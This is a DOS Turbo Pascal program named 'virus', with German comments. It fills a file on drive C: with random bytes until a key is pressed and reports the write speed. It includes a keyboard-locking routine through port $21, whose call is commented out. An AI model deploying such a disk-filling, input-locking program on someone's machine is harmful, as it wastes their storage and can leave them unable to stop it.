program virus;
{WOZU?? M 1024,0,65536}     { 1K Stack und max 64Kb Heap }

uses crt,dos;

var f:text;
writethis: string[250];  { String mit max. 250 Zeichen (string[1] nimmt z.B. weniger Speicher als string(=string[255]) ein) }
e:string;
b:string;
x:file of byte;
g:text;
s:integer;
d:integer;
a:longint;
z:text;
y:string;
st: longint;   { Timer Startwert (millisekunden) }
bc: longint;   { bytecount }
kbac: longint; { kB all count }
bps: real;     { bytes per second }
ifs: longint;  { initial file size }

procedure KeyboardDisable; forward;                             { Gibt an, da· die Prozedurdefinition erst spÑter folgt. }
procedure SetOut(h,m,s,hu: longint; var jow: longint); forward; { So kann man dann eine Prozedur schon aufrufen, auch wenn sie}
procedure StartTimer; forward;                                  { erst spÑter im Quelltext definiert wird. }
function TimeGone: longint; forward;                            { Au·erdem: mehr öbersicht! }
procedure CreateString; forward;
procedure w; forward;


PROCEDURE KeyboardDisable; {locks keyboard}
BEGIN
Port[$21] := Port[$21] or 2;
END;

procedure SetOut(h,m,s,hu: longint; var jow: longint);
begin
  jow := h*3600 + m*60 + s;
  jow := jow * 100 + hu;
end;

procedure StartTimer;
var h,m,s,hu: word;
begin
  GetTime(h,m,s,hu);
  SetOut(h,m,s,hu,st);
end;

function TimeGone: longint;
var h,m,s,hu: word;
    now: longint;
begin
  GetTime(h,m,s,hu);
  SetOut(h,m,s,hu,now);
  TimeGone := now - st;
end;

procedure CreateString;
var i: integer;
begin
  randomize;
  writethis := '';   { String nullsetzen, weil sonst Speicherwirrwarr in ihm ist }
  for i:=1 to 250 do begin
    writethis := writethis + Chr(Random(256));
  end;
end;

procedure w;
var i: integer;
begin;
{ An den 500 kannst Du rumspielen - das gibt an, wieviel Zeilen er pro
  Durchlauf schreiben soll - 500 ist ein optimaler Wert }

for i:=1 to 500 do begin     { FÅr i von 1 bis 500 mache ... }
  write(f,writethis);
  bc := bc + Length(writethis);
end;
end;

label 89;

begin;
     { keyboarddisable; }
       TextBackground(0);
       TextColor(7);
       ClrScr;
       StartTimer;
       CreateString;
       bc := 0;  { Bytecount auf 0 }
       kbac := 0; { kB-gesamtcounter auf 0 }
       assign(f,'c:\_.txt');
       assign(x,'c:\_.txt');
       {$I-}         { Ein-/AusgabeprÅfung abschalten }
       Reset(f);     { Versuchen, Datei zu îffnen }
       if IOResult<>0 then Rewrite(f);  { Wenn ein Fehler auftrat, dann Datei neu schreiben }

       { Dadurch wird die Datei einfach nur erweitert, falls schon 2MB existieren,
         anstatt sie zu lîschen und neu zu schreiben. ;-) }

       {$I+}         { E/A-Test wieder AN }
       reset(x);
       ifs := FileSize(x);
       close(x);
       ifs := ifs div 1024;
       repeat
         append(f);
         w;
         if TimeGone>175 then begin
           bps := bc / ( TimeGone / 100 );
           GotoXY(1,1);
           kbac := kbac + bc div 1024;
           WriteLn('Zeit: ',TimeGone,' ms  ---  Geschrieben: ',bc,' Bytes');
           WriteLn('Geschwindigkeit: ',bps:0:2,' Bytes/s = ',bps/1024:0:4,' kB/s = ',bps/(1024*1024):0:4,' MB/s');
           Write('Geschrieben gesamt: ',kbac,' kB (Dateigrî·e: ',ifs+kbac,' kB)');
           bc := 0;
           StartTimer;
         end;


         { Textausgaben auf den Bildschirm ziehen ungemein an der Geschwindigkeit! }

         (* writeln(f,'Die! ');
         reset(f);
         readln(f,e);
         randomize;
         s:=random(5);
         d:=random(3);
         textcolor(s);
         textbackground(d);
         clrscr;
         window(20,10,40,20);
         write(e);
         close(f);
         reset(x);
         reset(f);
         a:=filesize(x);
         window(1,1,19,9);
         gotoxy(1,1);
         writeln(a,' bytes');
         close(f);
         close(x); *)
       until keypressed; { Bis Tastendruck }
       ReadKey;          { Tastaturpuffer auslesen/leeren }
       Close(f);
end.


